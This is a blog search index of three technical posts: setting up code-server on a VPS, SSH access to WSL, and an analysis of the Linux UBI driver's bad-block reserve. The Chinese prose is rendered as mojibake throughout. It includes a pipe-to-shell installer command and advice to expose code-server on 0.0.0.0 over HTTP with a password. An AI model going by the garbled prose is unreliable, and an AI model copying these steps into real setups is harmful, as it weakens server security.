<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[VPSæ­å»ºåœ¨çº¿VSCode Server]]></title>
      <url>https://www.litreily.top/2020/06/13/code-server/</url>
      <content type="html"><![CDATA[<h2 id="VSCode-Server"><a href="#VSCode-Server" class="headerlink" title="VSCode Server"></a>VSCode Server</h2><p>VSCode(Visual Studio Code), æ˜¯æˆ‘ç›®å‰ä½¿ç”¨è¿‡çš„æœ€å¥½çš„ç¼–è¾‘å™¨ï¼Œä¹Ÿåº”è¯¥æ˜¯å¾ˆå¤šç¨‹åºå‘˜çš„é¦–é€‰ã€‚ç„¶è€Œå¾ˆå¤šäººä¸çŸ¥é“çš„æ˜¯ï¼Œè¿™æ¬¾å¼€å‘åˆ©å™¨è¿˜æœ‰åœ¨çº¿ç‰ˆï¼Œè¿™åŒ…æ‹¬GitHubå³å°†æ¨å‡ºçš„<code>Satellite</code>, ä¹Ÿä¼šæ­è½½VSCodeï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æƒ³è¦æ­å»ºè‡ªå·±çš„åœ¨çº¿å¼€å‘ç¯å¢ƒå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯<a href="https://github.com/cdr/code-server" target="_blank" rel="noopener">Code Server</a>, ä¸€æ¬¾å¯ä»¥éƒ¨ç½²åœ¨ä¸ªäººæœåŠ¡å™¨ä¸Šçš„VSCodeæœåŠ¡ã€‚</p>
<p><img src="/assets/vscode/pods-lg.png" alt="pods logo"></p>
<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å¦‚æœåœ¨æœ¬åœ°ï¼Œè‡ªç„¶æ˜¯æ— éœ€æ­å»ºè¿™ä¸ªserverçš„ï¼Œæˆ‘çš„é€‰æ‹©æ˜¯æ”¾åœ¨é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸Šï¼Œå¯¹åº”çš„æ˜¯Ubuntuç³»ç»Ÿï¼Œå®‰è£…è¿‡ç¨‹éå¸¸ç®€å•ã€‚</p>
<pre><code class="zsh">curl -fsSL https://code-server.dev/install.sh |sh
</code></pre>
<p>å®‰è£…å®Œä¼šç»™å‡ºæç¤ºè¯¥æ€ä¹ˆæ“ä½œï¼Œå…¶å®ƒç³»ç»Ÿå¯ä»¥å‚è€ƒ<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><p>ä½¿ç”¨<code>systemctl</code>å¯åŠ¨æœåŠ¡ï¼Œå¹¶ä¿è¯ç³»ç»Ÿé‡å¯å¯ä»¥è‡ªå¯åŠ¨æœåŠ¡ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="zsh">systemctl --user enable --now code-server
</code></pre>
<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>VSCodeæœåŠ¡æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶<code>~/.config/code-server/config.yaml</code>ï¼Œé»˜è®¤é…ç½®åŒ…å«ï¼š</p>
<pre><code class="yaml">bind-addr: 127.0.0.1:8080
auth: password
password: somerandominfo
cert: false
</code></pre>
<p>é»˜è®¤æƒ…å†µä¸‹å¼€å¯äº†å¯†ç è®¤è¯ï¼ŒåŒæ—¶ç»™äº†ä¸€ä¸ªåˆå§‹å¯†ç ã€‚æˆ‘ä»¬å¯ä»¥å°†ç«¯å£å·å’Œå¯†ç éƒ½ä¿®æ”¹æˆè‡ªå·±æƒ³è¦çš„ã€‚ä¿®æ”¹å®Œæˆä»¥åï¼Œè®°å¾—é‡å¯æœåŠ¡ã€‚</p>
<pre><code class="zsh">systemctl --user restart code-server
</code></pre>
<h2 id="VPSå®‰å…¨ç»„"><a href="#VPSå®‰å…¨ç»„" class="headerlink" title="VPSå®‰å…¨ç»„"></a>VPSå®‰å…¨ç»„</h2><p>å¦‚æœä½¿ç”¨çš„æ˜¯VPSï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ä¼šå°†é™¤sshä»¥å¤–çš„å…¶å®ƒç«¯å£éƒ½å±è”½çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡å™¨çš„æ§åˆ¶å°ä¿®æ”¹å®‰å…¨ç»„ã€‚</p>
<p><img src="/assets/vscode/vps-port.png" alt="VPS å®‰å…¨ç»„"></p>
<p>ä½†æ˜¯æ·»åŠ ä»¥åè¿˜æ˜¯æ— æ³•è®¿é—®ï¼Œåæ¥è°·æ­Œåå‘ç°æ˜¯é…ç½®é—®é¢˜ï¼Œä¸Šé¢çš„<code>127.0.0.1</code>åªæ˜¯é’ˆå¯¹æœ¬åœ°åœ°å€ï¼Œæ— æ³•è¢«å¤–éƒ¨ç½‘ç»œè®¿é—®ï¼Œå› æ­¤ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯å°†<code>127.0.0.1</code>æ”¹ä¸º<code>0.0.0.0</code>ï¼Œç„¶åé‡å¯æœåŠ¡ã€‚</p>
<h2 id="å®ä¾‹å±•ç¤º"><a href="#å®ä¾‹å±•ç¤º" class="headerlink" title="å®ä¾‹å±•ç¤º"></a>å®ä¾‹å±•ç¤º</h2><p>é€šè¿‡é…ç½®å¥½çš„ç«¯å£è®¿é—®VPSçš„Code Serverï¼Œé¦–å…ˆè¿›å…¥ç™»å½•é¡µé¢ï¼Œè¾“å…¥é…ç½®çš„å¯†ç å³å¯ã€‚</p>
<p><img src="/assets/vscode/code-login.png" alt="ç™»å½• Code Server"></p>
<p>å¥½å•¦ï¼ŒåŸºæœ¬å’Œæœ¬åœ°çš„ä¸€æ¯›ä¸€æ ·ï¼Œç›®å‰å°è¯•è¿‡ç¨‹å‘ç°æ— æ³•å¤åˆ¶ç½‘é¡µå¤–çš„å…¶å®ƒæ•°æ®ï¼Œç»ˆç«¯æ— æ³•ä½¿ç”¨<code>Ctrl-L</code>æ¸…ç©ºï¼Œç®—æ˜¯å°ç‘•ç–µå§ï¼Œä¸è¿‡çœŸçš„è¶…æ£’ï¼Œæˆ‘æƒ³ï¼Œé’ˆå¯¹éœ€è¦å‡ºå·®çš„äººç¾¤ç®—æ˜¯ç¦éŸ³äº†ã€‚</p>
<p><img src="/assets/vscode/code-server.png" alt="Code Server"></p>
<p>é¦–æ¬¡è¿è¡Œä¼šæ¯”è¾ƒæ…¢ï¼Œå½“ç„¶å¯èƒ½æ˜¯æˆ‘çš„ç½‘é€Ÿé—®é¢˜ï¼ŒåŠ è½½ä¸€ä¸ªå¤§å‹<code>js</code>æ–‡ä»¶<code>workbench.web.api.js</code>å æ®äº†å¤§é‡æ—¶é—´ï¼Œåœ¨å¯ç”¨æµè§ˆå™¨ç¼“å­˜çš„æƒ…å†µä¸‹ï¼Œå¾€åå¯åŠ¨å°±æ›´å¿«äº†ã€‚</p>
<p>å¦å¤–ï¼Œå¦‚æœæœ‰åŸŸåçš„è¯ï¼Œå¯ä»¥æŒ‰ç…§å®˜æ–¹æ•™ç¨‹å®‰è£…<a href="https://github.com/cdr/code-server/blob/master/doc/guide.md#lets-encrypt" target="_blank" rel="noopener">Let&#39;s Encrypt.</a>è¯ä¹¦ï¼Œç„¶åé€šè¿‡<code>https</code>è®¿é—®ï¼Œè¿™æ ·æ›´åŠ å®‰å…¨ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> vps </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Win10ä¸­ä½¿ç”¨sshè®¿é—®WSL]]></title>
      <url>https://www.litreily.top/2020/05/08/putty-wsl/</url>
      <content type="html"><![CDATA[<p>win10çš„WSLä½œä¸ºç›®å‰æ—¥å¸¸å¿…å¤‡ï¼Œå®åœ¨æ˜¯çˆ±ä¸é‡Šæ‰‹ï¼Œå¥ˆä½•é»˜è®¤ç»ˆç«¯ç•Œé¢å®åœ¨ä¸€è¨€éš¾å°½ï¼Œå°½ç®¡é…è‰²é—®é¢˜å¯ä»¥è§£å†³ï¼Œä½†æ˜¯å­—ä½“é—®é¢˜å¯¼è‡´ohmyzshçš„å¾ˆå¤šå›¾æ ‡æ— æ³•æ­£å¸¸æ˜¾ç¤ºï¼Œé…ç½®å¥½<a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">powerline</a>å­—ä½“ç•¥æœ‰æ”¹å–„ï¼Œä½†é…åˆtmuxä½¿ç”¨åˆä¼šå‡ºç°ä¹±ç é—®é¢˜ï¼Œå®åœ¨éš¾ä»¥å¿å—ï¼Œäºæ˜¯å‡†å¤‡é€šè¿‡sshé—´æ¥è®¿é—®ã€‚</p>
<h2 id="é…ç½®ssh"><a href="#é…ç½®ssh" class="headerlink" title="é…ç½®ssh"></a>é…ç½®ssh</h2><p>é‡è£…<code>openssh-server</code>, å¦‚æœè‡ªå¸¦çš„æ²¡é—®é¢˜ä¹Ÿä¸ç”¨é‡è£…ã€‚</p>
<pre><code class="zsh">sudo apt remove openssh-server
sudo apt install openssh-server
</code></pre>
<p>ä¿®æ”¹<code>/etc/ssh/sshd_config</code></p>
<pre><code class="zsh"># æœåŠ¡ç«¯æ¯åˆ†é’Ÿå‘é€ä¸€æ¬¡æ•°æ®åŒ…ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å›å¤å³ä¿æŒè¿æ¥
ClientAliveInterval 60
# å®¢æˆ·ç«¯3æ¬¡æœªå“åº”åˆ™æ–­å¼€
ClientAliveCountMax 3

# å¼€å¯å¯†ç è®¤è¯ï¼Œæ‹’ç»ç©ºå¯†ç 
PasswordAuthentication yes
PermitEmptyPasswords no
</code></pre>
<p>æ‰‹åŠ¨å¯åŠ¨ssh, å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•ï¼ŒäºŒé€‰ä¸€</p>
<pre><code class="zsh">sudo service ssh start
sudo /etc/init.d/ssh start
</code></pre>
<h2 id="å¼€æœºè‡ªå¯åŠ¨"><a href="#å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="å¼€æœºè‡ªå¯åŠ¨"></a>å¼€æœºè‡ªå¯åŠ¨</h2><p>ä¸ºäº†ä¿è¯æ¯æ¬¡å¼€æœºå¯ä»¥ç›´æ¥é€šè¿‡puttyæ‰“å¼€WSLï¼Œéœ€è¦å¼€æœºè‡ªå¯åŠ¨sshï¼Œæ€ä¹ˆå®ç°å‘¢ï¼Œå‚è€ƒçŸ¥ä¹æ–‡ç«  <a href="https://zhuanlan.zhihu.com/p/47733615" target="_blank" rel="noopener">WSL æœåŠ¡è‡ªåŠ¨å¯åŠ¨çš„æ­£ç¡®æ–¹æ³•</a> ï¼Œç®€å•æ•´ç†å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>Win R</code>è¿è¡Œ<code>shell:startup</code>æ‰“å¼€windowsçš„è‡ªå¯åŠ¨ç›®å½•</li>
<li>æ·»åŠ è„šæœ¬<code>wsl.vbs</code>, è¾“å…¥ä»¥ä¸‹ä¿¡æ¯ç„¶åä¿å­˜æ–‡ä»¶</li>
</ul>
<pre><code class="vbs">Set ws = CreateObject(&quot;Wscript.Shell&quot;)
ws.run &quot;wsl -d ubuntu -u root /etc/init.d/ssh start&quot;, vbhide
</code></pre>
<h2 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h2><p>å®‰è£… <a href="https://github.com/tonsky/FiraCode" target="_blank" rel="noopener">Fira code</a> å­—ä½“ï¼Œè¶…46kçš„starï¼Œè¿˜æ˜¯å¾ˆå¼ºå¤§çš„ã€‚å®‰è£…åä¿®æ”¹ä¸‹puttyå’ŒVSCodeçš„å­—ä½“ã€‚</p>
<ul>
<li>puttyï¼Œæ‰“å¼€settingsï¼Œé€‰æ‹©Window-&gt;Appearance-&gt;Font settings, è®¾ç½®<code>Fira code</code>å­—ä½“ã€‚</li>
<li>VSCodeï¼Œæ‰“å¼€settingsï¼Œæœç´¢&quot;font family&quot;ï¼Œåœ¨å·²æœ‰å­—ä½“ä¸­åŠ å…¥<code>Fira Code Retina</code>å­—ä½“ã€‚</li>
</ul>
<p><img src="/assets/vscode/vscode-font.png" alt="VSCode Font family"></p>
<p>é…ç½®VSCodeçš„åŸå› æ˜¯VSCodeæœ¬èº«ä¹Ÿå¯ä»¥ä½¿ç”¨WSLï¼Œæ‰€ä»¥å­—ä½“æ–¹é¢ä¹Ÿå¯ä»¥è¿›è¡Œä¿®æ­£ã€‚</p>
<h2 id="putty"><a href="#putty" class="headerlink" title="putty"></a>putty</h2><p>puttyé™¤äº†é…ç½®å­—ä½“å¤–ï¼Œè¿˜å¯ä»¥é…ç½®<code>Alt-Enter</code>å…¨å±å¿«æ·é”®ï¼Œå½“ç„¶æœ€ä¸»è¦çš„è¿˜æ˜¯é…ç½®è¿æ¥WSLçš„ssh. ç”±äºæ˜¯æœ¬æœºï¼Œä½¿ç”¨localhostæˆ–è€…<code>127.0.0.1</code>å°±å¯ä»¥ã€‚</p>
<p><img src="/assets/putty/putty-wsl.png" alt="putty wsl"></p>
<p>åŒæ—¶é…ç½®ä¸‹é»˜è®¤ç”¨æˆ·åï¼Œå¯ä»¥å…å»æ¯æ¬¡æ‰“å¼€æ—¶è¾“å…¥ç”¨æˆ·åçš„éº»çƒ¦ã€‚</p>
<p><img src="/assets/putty/putty-data.png" alt="putty default user"></p>
<p>æœ€åæ¥çœ‹ä¸‹è¿æ¥åçš„æ•ˆæœ</p>
<p><img src="/assets/putty/putty-tmux.png" alt="putty tmux"></p>
<p>å¥½å•¦ï¼Œå®Œç»“æ’’èŠ±~</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/47733615" target="_blank" rel="noopener">WSL æœåŠ¡è‡ªåŠ¨å¯åŠ¨çš„æ­£ç¡®æ–¹æ³•</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
            <tag> putty </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux å†…æ ¸é©±åŠ¨è§£æ - UBIåå—é¢„ç•™å¤§å°]]></title>
      <url>https://www.litreily.top/2020/05/07/ubi-driver/</url>
      <content type="html"><![CDATA[<p>åœ¨å¤„ç†ubifsç›¸å…³bugçš„è¿‡ç¨‹ä¸­ï¼Œå­¦ä¹ äº†ubié©±åŠ¨å¯¹åå—ä¿ç•™åˆ†åŒºçš„å¤„ç†æ–¹å¼ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p>
<p><img src="/assets/linux/ubi-reserved-maps.png" alt="ubi reserved mind maps"></p>
<h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><h3 id="mtd"><a href="#mtd" class="headerlink" title="mtd"></a>mtd</h3><p><strong>mtd</strong> å…¨ç§° memory technology device å†…å­˜æŠ€æœ¯è®¾å¤‡ï¼Œæ˜¯ç”¨äºè®¿é—®å†…å­˜è®¾å¤‡(RAM, Flash)çš„Linux å­ç³»ç»Ÿï¼Œåœ¨ç¡¬ä»¶å±‚å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´æä¾›æŠ½è±¡æ¥å£ã€‚</p>
<p>åœ¨åµŒå…¥å¼linuxè®¾å¤‡ä¸­çš„<code>/dev/</code>ç›®å½•ä¸‹æœ‰å¾ˆå¤š<code>/dev/mtdxx</code>æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¯¹åº”çš„å°±æ˜¯å†…å­˜è®¾å¤‡ã€‚æ¯”å¦‚ï¼ŒåµŒå…¥å¼è®¾å¤‡çš„Nand Flashè¢«åˆ’åˆ†ä¸ºå¤šä¸ªåˆ†åŒºï¼Œæ¯ä¸ªåˆ†åŒºå¯¹åº”ä¸€ä¸ª<code>/dev/mtdxx</code>æ–‡ä»¶ã€‚</p>
<p>å¦‚ä¸‹æ‰€ç¤ºï¼Œ<code>/dev/mtd0</code>è‡³<code>/dev/mtd10</code>å¯¹åº”ubootåˆ†åŒºï¼Œ<code>mtd21</code>å¯¹åº”å›ºä»¶åˆ†åŒºï¼Œ<code>mtd20</code>å°±æ˜¯æœ¬æ–‡å°†è¦ç”¨åˆ°çš„æ•°æ®åˆ†åŒºã€‚</p>
<pre><code class="sh">root:/dev# ls mtd* |grep -v block
mtd0        mtd16ro     mtd23ro     mtd30ro
mtd0ro      mtd17       mtd24       mtd31
mtd1        mtd17ro     mtd24ro     mtd31ro
mtd10       mtd18       mtd25       mtd3ro
mtd10ro     mtd18ro     mtd25ro     mtd4
mtd11       mtd19       mtd26       mtd4ro
mtd11ro     mtd19ro     mtd26ro     mtd5
mtd12       mtd1ro      mtd27       mtd5ro
mtd12ro     mtd2        mtd27ro     mtd6
mtd13       mtd20       mtd28       mtd6ro
mtd13ro     mtd20ro     mtd28ro     mtd7
mtd14       mtd21       mtd29       mtd7ro
mtd14ro     mtd21ro     mtd29ro     mtd8
mtd15       mtd22       mtd2ro      mtd8ro
mtd15ro     mtd22ro     mtd3        mtd9
mtd16       mtd23       mtd30       mtd9ro
root:/dev#
root:/dev# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00100000 00020000 &quot;0:SBL1&quot;
mtd1: 00100000 00020000 &quot;0:MIBIB&quot;
mtd2: 00100000 00020000 &quot;0:BOOTCONFIG&quot;
...
mtd7: 00080000 00020000 &quot;0:BOOTCONFIG1&quot;
mtd8: 00080000 00020000 &quot;0:APPSBLENV&quot;
mtd9: 00200000 00020000 &quot;0:APPSBL&quot;
mtd10: 00200000 00020000 &quot;0:APPSBL_1&quot;
mtd11: 00080000 00020000 &quot;0:ART&quot;
mtd12: 00080000 00020000 &quot;0:ART.bak&quot;
mtd13: 00100000 00020000 &quot;config&quot;
mtd14: 00080000 00020000 &quot;data1&quot;
mtd15: 00040000 00020000 &quot;data2&quot;
...
mtd20: 01e00000 00020000 &quot;mtddata&quot;
mtd21: 02800000 00020000 &quot;firmware&quot;
...
mtd25: 02780000 00020000 &quot;reserved&quot;
</code></pre>
<h3 id="ubi"><a href="#ubi" class="headerlink" title="ubi"></a>ubi</h3><p><strong>ubi</strong> æ˜¯Unsorted Block Imageçš„ç®€ç§°ï¼Œubifsæ˜¯Unsorted Block Image File System(æ— åºåŒºå—é•œåƒæ–‡ä»¶ç³»ç»Ÿ)çš„ç®€ç§°ï¼Œæ„å»ºäºMTDä¹‹ä¸Šï¼Œå¯æ“æ§å¤§å®¹é‡çš„Nand flash.</p>
<p>nand flash, mtd å’Œubifsä¸‰è€…å…³ç³»å¯ä»¥ç®€è¿°ä¸ºï¼šnand flashä½œä¸ºç¡¬ä»¶è®¾å¤‡ï¼Œmtdä»‹äºç¡¬ä»¶è®¾å¤‡å’Œç”¨æˆ·å±‚é—´æä¾›æŠ½è±¡æ¥å£ï¼Œubifsæ˜¯åœ¨mtdä¹‹ä¸Šæ„å»ºçš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ–¹ä¾¿å¯¹nand flashè¿›è¡Œæ•°æ®è¯»å†™ã€‚</p>
<p>ubiç›¸å…³æ¦‚å¿µæœ‰:</p>
<ul>
<li>PEB: physical eraseblock, ç‰©ç†æ“¦é™¤å—ï¼Œé€šå¸¸ä¸º128KB(131072 Bytes)</li>
<li>LEB: logical eraseblock, é€»è¾‘æ“¦é™¤å—ï¼Œé€šå¸¸ä¸º124KB(126976 Bytes)</li>
</ul>
<blockquote>
<p><strong>UBI Headers</strong><br>UBI stores 2 small 64-byte headers at the beginning of each non-bad physical eraseblock:  </p>
<ul>
<li>erase counter header (or <strong>EC</strong> header) which contains the erase counter of the physical eraseblock (PEB) plus other information;</li>
<li>volume identifier header (or <strong>VID</strong> header) which stores the volume ID and the logical eraseblock (LEB) number to which this PEB belongs.</li>
</ul>
</blockquote>
<p>ä»å­—é¢æ„æ€ä¹Ÿå¯ä»¥ç†è§£ï¼ŒLEBæ˜¯é€»è¾‘å—ï¼ŒPEBæ˜¯ç‰©ç†å—ï¼Œå®é™…ä¸ŠLEBåŒ…å«äºPEBï¼Œé€šå¸¸LEBä¼šæ¯”PEBå°4KBï¼Œå…¶ä¸­2KBç”¨äºå­˜å‚¨VID Headers, å¦å¤–2KBæ˜¯åç§»é‡ï¼Œç”¨äºå¯¹é½ã€‚</p>
<h2 id="console-log"><a href="#console-log" class="headerlink" title="console log"></a>console log</h2><p>äº†è§£äº†ç›¸å…³æ¦‚å¿µï¼Œæ¥ä¸‹æ¥ä»åµŒå…¥å¼è®¾å¤‡çš„console logçœ‹çœ‹UBIç›¸å…³çš„ä¿¡æ¯ï¼Œä¾æ®logå¯ä»¥æ–¹ä¾¿åœ¨ç”¨æˆ·ç©ºé—´æˆ–è€…å†…æ ¸ç©ºé—´æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå®šä½åˆ°ä¸ä¹‹ç›¸å…³çš„ä»£ç ã€‚</p>
<h3 id="UBI-attach"><a href="#UBI-attach" class="headerlink" title="UBI attach"></a>UBI attach</h3><p>é¦–å…ˆæ¥çœ‹ä¸‹åµŒå…¥å¼linuxè®¾å¤‡å¼€æœºè¿‡ç¨‹ä¸­UBIè®¾å¤‡çš„åŠ è½½ä¿¡æ¯</p>
<pre><code class="zsh">Info: init ubi volumes on mtddata raw partition
UBI: attaching mtd20 to ubi0
random: procd: uninitialized urandom read (4 bytes read, 60 bits of entropy available)
UBI: scanning is finished
UBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0
UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0
UBI: user volume: 5, internal volumes: 1, max. volumes count: 128
UBI: max/mean erase counter: 2/1, WL threshold: 4096, image sequence number: 860068978
UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20
UBI: background thread &quot;ubi_bgt0d&quot; started, PID 115
UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)
Info: attach ubi device on mtddata success!
</code></pre>
<p>ä»¥ä¸Šä¿¡æ¯ç»å¤§éƒ¨åˆ†åœ¨å†…æ ¸UBIé©±åŠ¨çš„<code>build.c/ubi_attach_mtd_dev</code>å‡½æ•°ä¸­æ‰“å°è¾“å‡ºï¼Œä¸‹é¢å†…æ ¸ç©ºé—´éƒ¨åˆ†ä¼šè®²åˆ°ã€‚</p>
<p>ä¸‹é¢åˆ†æå…¶ä¸­å‡ æ¡ä¸»è¦ä¿¡æ¯ï¼š</p>
<pre><code class="zsh"># åœ¨ mtddata åŸå§‹åˆ†åŒºåˆå§‹åŒ– ubi å·
Info: init ubi volumes on mtddata raw partition
# å°†mtd20é™„åŠ åˆ°ubi0...
UBI: attaching mtd20 to ubi0
# å°†mtd20é™„åŠ åˆ°ubi0 å®Œæˆ
UBI: attached mtd20 (name &quot;mtddata&quot;, size 30 MiB) to ubi0
# PEB 128KB, LEB 124KB
UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
# æœ€å°æœ€å¤§I/Oè¯»å†™å•å…ƒï¼š2048/2048, subpage 2048, å°±æ˜¯2KB
UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
# VID headeråç§»é‡2KBï¼Œç”¨äºå¯¹é½ï¼Œæ•°æ®åç§»é‡4KB
UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
# 240 pebsæ­£å¸¸ï¼Œæ— åå—
UBI: good PEBs: 240, bad PEBs: 0, corrupted PEBs: 0
# å‰©ä½™å¯ç”¨3 PEBs, æ€»ä¿ç•™ 237 PEBs(å·²ç”¨æˆ–ä¿ç•™)ï¼Œç”¨äºåå—å¤„ç†çš„ä¿ç•™PEBs 20ï¼ˆæœ¬æ–‡è®¨è®ºé‡ç‚¹ï¼‰
UBI: available PEBs: 3, total reserved PEBs: 237, PEBs reserved for bad PEB handling: 20
# UBI è®¾å¤‡å·0ï¼Œå…±240 LEBsï¼ˆ29.1MB)ï¼Œå‰©ä½™å¯ç”¨3 LEBsï¼Œæ¯ä¸ªLEBå¤§å°ä¸º124KB
UBI device number 0, total 240 LEBs (30474240 bytes, 29.1 MiB), available 3 LEBs (380928 bytes, 372.0 KiB), LEB size 126976 bytes (124.0 KiB)
# æˆåŠŸåœ¨mtddataé™„åŠ ubiè®¾å¤‡
Info: attach ubi device on mtddata success!
</code></pre>
<p>ä»logä¸­å¯ä»¥çŸ¥æ™“å¾ˆå¤šå…³é”®ä¿¡æ¯ï¼ŒUBIæŒ‚è½½çš„åˆ†åŒºåç§°ä¸ºmtddataï¼Œå¯¹åº”mtd20; PEB 128KBï¼Œ LEB 124KB; ubi0å…±240 LEBs/PEBs, å‰©ä½™å¯ä»¥3 LEBs/PEBs, æ— åå—; ç”¨äºåå—å¤„ç†çš„ä¿ç•™éƒ¨åˆ†ä¸º20 PEBs, æœ¬æ–‡åç»­å°†è¦ä»‹ç»çš„å°±æ˜¯è¿™ä¸ªä¿ç•™20 PEBsæ˜¯å¦‚ä½•å¾—æ¥çš„ã€‚</p>
<h3 id="ubinfo-a"><a href="#ubinfo-a" class="headerlink" title="ubinfo -a"></a>ubinfo -a</h3><p>å¼€æœºè¿‡ç¨‹ä¼šè‡ªåŠ¨æ‰“å°UBIçš„ä¿¡æ¯ï¼Œé‚£å¼€æœºåå¦‚ä½•æ‰‹åŠ¨è·å–å‘¢ï¼Œè¿™å°±è¦ç”¨åˆ°ubiç›¸å…³çš„å·¥å…·é›†äº†ï¼Œubiç›¸å…³çš„æŒ‡ä»¤åŒ…å«ï¼š</p>
<pre><code class="zsh">root:/# ubi
ubiattach     ubidetach     ubinfo        ubirmvol
ubiblock      ubiformat     ubinize       ubirsvol
ubicrc32      ubimkvol      ubirename     ubiupdatevol
</code></pre>
<p>å…¶ä¸­çš„<code>ubinfo</code>å°±å¯ä»¥æŸ¥çœ‹ubiä¿¡æ¯</p>
<pre><code class="sh">root:/# ubinfo -a
UBI version:                    1
Count of UBI devices:           1
UBI control device major/minor: 10:60
Present UBI devices:            ubi0

ubi0
Volumes count:                           5
Logical eraseblock size:                 126976 bytes, 124.0 KiB
Total amount of logical eraseblocks:     240 (30474240 bytes, 29.1 MiB)
Amount of available logical eraseblocks: 3 (380928 bytes, 372.0 KiB)
Maximum count of volumes                 128
Count of bad physical eraseblocks:       0
Count of reserved physical eraseblocks:  20
Current maximum erase counter value:     2
Minimum input/output unit size:          2048 bytes
Character device major/minor:            249:0
Present volumes:                         0, 1, 2, 3, 4
...
</code></pre>
<p>ubi0åŒ…å«5ä¸ªåˆ†å·ï¼Œæœ€å¤šå¯åŒ…å«128ä¸ªåˆ†å·ï¼Œå…¶å®ƒåŸºæœ¬ä¿¡æ¯ä¸å¼€æœºè¿‡ç¨‹ä¸­å†…æ ¸æ‰“å°çš„ä¿¡æ¯ä¸€è‡´ï¼Œæœ¬æ–‡ä¸»è¦å…³å¿ƒä¸‹é¢è¿™ä¸€æ¡ä¿¡æ¯ã€‚</p>
<pre><code class="sh">Count of reserved physical eraseblocks:  20
</code></pre>
<p>å¥½å•¦ï¼Œåˆ°æ­¤å°±è·å–å¹¶åˆ†æäº†æœ€ç›´è§‚çš„logä¿¡æ¯ï¼Œä¸‹é¢å°†ä»ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¸¤ä¸ªç»´åº¦æ¥è¿½æº¯è¿™ä¸ª20 PEBsæ˜¯æ€ä¹ˆæ¥çš„ã€‚</p>
<h2 id="ç”¨æˆ·ç©ºé—´"><a href="#ç”¨æˆ·ç©ºé—´" class="headerlink" title="ç”¨æˆ·ç©ºé—´"></a>ç”¨æˆ·ç©ºé—´</h2><p>åœ¨ç”¨æˆ·ç©ºé—´çš„ubi-utilsä»£ç åº“ä¸­æœç´¢â€œCount of reserved physical eraseblocksâ€ï¼Œå°±å¯ä»¥å®šä½åˆ°å‡½æ•°<code>ubinfo.c/print_dev_info</code></p>
<h3 id="print-dev-info"><a href="#print-dev-info" class="headerlink" title="print_dev_info"></a>print_dev_info</h3><pre><code class="c">static int print_dev_info(libubi_t libubi, int dev_num, int all)
{
    int i, err, first = 1;
    struct ubi_dev_info dev_info;
    struct ubi_vol_info vol_info;

    err = ubi_get_dev_info1(libubi, dev_num, &amp;dev_info);
    if (err)
        return sys_errmsg(&quot;cannot get information about UBI device %d&quot;, dev_num);

    printf(&quot;ubi%d\n&quot;, dev_info.dev_num);
    printf(&quot;Volumes count:                           %d\n&quot;, dev_info.vol_count);
    printf(&quot;Logical eraseblock size:                 &quot;);
    util_print_bytes(dev_info.leb_size, 0);
    printf(&quot;\n&quot;);

    printf(&quot;Total amount of logical eraseblocks:     %d (&quot;, dev_info.total_lebs);
    util_print_bytes(dev_info.total_bytes, 0);
    printf(&quot;)\n&quot;);

    printf(&quot;Amount of available logical eraseblocks: %d (&quot;, dev_info.avail_lebs);
    util_print_bytes(dev_info.avail_bytes, 0);
    printf(&quot;)\n&quot;);

